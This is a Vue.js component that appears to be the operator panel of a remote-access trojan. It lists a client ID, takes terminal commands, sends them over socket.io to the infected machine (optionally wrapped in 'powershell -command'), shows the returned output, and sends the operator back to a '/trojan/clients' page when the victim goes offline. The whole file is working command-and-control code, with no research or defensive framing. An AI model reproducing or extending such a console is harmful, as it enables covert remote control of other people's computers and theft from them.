<template>
  <div id="sshContainer">
    <div class="wrapper">
      <div><span @click="$router.go(-1)" class="backLink">←返回</span></div>
      <div>
        <h2>客户端ID: {{ id }}</h2>
      </div>
      <div id="control-input-group">
        <label for="sshInput">请输入终端命令:</label>
        <input
          type="text"
          name="sshInput"
          v-model="sshInput"
          @keypress.enter="submit"
        />
        <input
          type="button"
          value="提交"
          @click="submit"
          style="margin-right: 7px"
        />
        <input name="powershell" type="checkbox" v-model="powershell" />
        <label for="powershell" style="font-size: 0.6rem">PowerShell终端</label>
        <button @click="sshOutput = ''" style="margin-left: 10px">
          清空下方(ctrl+L)
        </button>
        <span style="margin-left: 10px; font-size: 0.9rem; color: green">{{
          sshStatus
        }}</span>
      </div>
      <div id="sshOutput">
        <textarea
          name="sshOutput"
          id=""
          v-model="sshOutput"
          ref="sshOutput"
        ></textarea>
      </div>
    </div>
  </div>
</template>

<script>
// import io from "socket.io-client";

export default {
  props: ["id"],
  data: function () {
    return {
      clientArr: window.clientArr,
      sshInput: "",
      sshOutput: "终端回调结果显示在这里",
      sshStatus: "",
      interval: null,
      powershell: true,
      shortcut: {
        clearInput: null,
      },
    };
  },
  watch: {},
  beforeMount() {
    class util {}

    //注册快捷键事件
    this.shortcut.clearInput = document.documentElement.addEventListener(
      "keydown",
      (event) => {
        event = event || window.event;
        //清空输出结果
        if (event.key == "l" && event.ctrlKey) {
          event.preventDefault();
          this.sshOutput = "";
        }
      }
    );
    util.IdIndex = function (id) {
      for (let i = 0; i < window.clientArr.length; i++) {
        if (window.clientArr[i].id === id) {
          return i;
        }
      }
      return -1;
    };
    this.clientArr = window.clientArr;
    this.interval = setInterval(() => {
      if (window.cmdResult.data.length) {
        this.sshStatus = "";
        this.sshOutput = this.sshOutput.concat(window.cmdResult.data);
        setTimeout(() => {
          this.$refs.sshOutput.scrollTop = this.$refs.sshOutput.scrollHeight;
        }, 100);
        window.cmdResult.data = "";
      }

      if (util.IdIndex(this.id) == -1) {
        clearInterval(this.interval);
        // alert("此客户端已离线");
        this.$router.push("/trojan/clients");
      }
    }, 200);
  },
  beforeRouteLeave(to, from, next) {
    window.cmdResult.data = "";
    clearInterval(this.interval);

    //清除快捷键注册
    for (const key in this.shortcut) {
      if (Object.hasOwnProperty.call(this.shortcut, key)) {
        if (this.shortcut[key]) {
          removeEventListener(this.shortcut[key]);
        }
      }
    }
    next();
  },
  afterRouteEnter(to, from, next) {
    next();
  },
  methods: {
    submit() {
      if (!this.sshInput.length) return;
      this.sshStatus = "等待回调...";
      // eslint-disable-next-line no-undef
      if (this.powershell) {
        window.io.emit(
          "apisendcmd",
          this.id,
          `powershell -command "${this.sshInput}"`
        );
      } else {
        window.io.emit("apisendcmd", this.id, this.sshInput);
      }
      // this.sshInput = "";
    },
  },
};
</script>

<style lang="less" scoped>
.backLink {
  color: black;
  line-height: 10px;
  &:hover {
    color: green;
  }
}
#sshContainer {
  display: flex;
  align-items: center;
  justify-content: center;
  flex-direction: column;
  .wrapper {
    display: flex;
    align-items: flex-start;
    flex-direction: column;
    justify-content: center;
    #control-input-group {
      display: flex;
      flex-direction: row;
      justify-content: center;
      align-items: center;
    }
    #sshOutput {
      display: flex;
      justify-content: center;
      align-items: flex-start;
      flex-direction: column;
      // margin-top: 10%;
      height: 50vh;
      textarea {
        // border: none;
        margin-top: 5%;
        height: 100%;
        width: 95vw;
      }
    }
  }
}
</style>
